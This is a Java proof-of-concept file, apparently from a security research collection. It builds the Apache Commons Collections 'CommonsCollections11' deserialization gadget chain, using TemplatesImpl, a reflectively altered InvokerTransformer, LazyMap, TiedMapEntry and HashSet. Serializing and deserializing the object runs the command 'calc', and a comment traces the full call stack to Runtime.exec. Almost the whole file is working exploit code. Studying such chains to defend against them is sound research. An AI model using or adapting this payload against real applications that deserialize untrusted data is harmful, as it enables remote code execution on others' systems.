package com.javasec.pocs.cc;

import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * transform:126, InvokerTransformer (org.apache.commons.collections.functors)
 * get:158, LazyMap (org.apache.commons.collections.map)
 * getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
 * hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
 * hash:338, HashMap (java.util)
 * put:611, HashMap (java.util)
 * readObject:334, HashSet (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:59, SerializeUtils (com.javasec.utils)
 * main:24, CommonsCollections11ver1 (com.javasec.pocs.cc)
 */
public class CommonsCollections11ver1 {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = SerializeUtils.MakeHashSet(tiedmap);
        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");
        SerializeUtils.base64deserial(SerializeUtils.base64serial(hashset));
    }
}
